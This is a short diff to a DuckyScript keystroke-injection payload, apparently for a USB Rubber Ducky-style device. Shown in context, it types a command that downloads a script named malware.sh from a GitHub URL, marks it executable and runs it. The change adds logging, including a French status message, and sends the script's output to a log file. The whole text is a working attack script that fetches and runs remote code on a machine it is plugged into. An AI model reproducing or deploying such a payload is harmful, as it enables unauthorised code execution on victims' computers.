@@ -8,7 +8,8 @@ STRING curl -L https://github.com/noahlgrd01/NoahSilentDucky/raw/main/malware.sh
 ENTER
 DELAY 60000
 STRING chmod +x /tmp/malware.sh
+STRING echo "[*] Droits d'exécution attribués à malware.sh" >> /tmp/malware.log
 ENTER
 DELAY 500
-STRING /tmp/malware.sh
+STRING /tmp/malware.sh >> /tmp/malware.log
 ENTER
